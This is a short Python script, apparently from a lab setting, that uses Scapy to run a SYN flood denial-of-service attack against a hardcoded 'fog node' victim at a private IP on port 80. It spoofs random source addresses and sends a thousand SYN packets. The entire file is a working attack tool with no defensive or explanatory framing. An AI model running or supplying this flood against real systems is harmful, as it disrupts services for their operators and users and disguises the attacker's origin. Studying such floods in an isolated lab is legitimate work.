# pip3 install scapy
# subject to change but an idea, taken from github and medium custom attack

from scapy.all import IP, TCP, send
import random

target_ip = "192.168.1.10"  # Fog node IP (victim) can be ssh 22 too
target_port = 80

def syn_flood(target_ip, target_port, count=1000):
    print(f"[+] Starting SYN flood attack against {target_ip}:{target_port}")
    for _ in range(count):
        src_ip = f"192.168.1.{random.randint(2,254)}"
        packet = IP(src=src_ip, dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
        send(packet, verbose=False)
    print("[+] SYN flood attack completed.")

if __name__ == "__main__":
    syn_flood(target_ip, target_port)
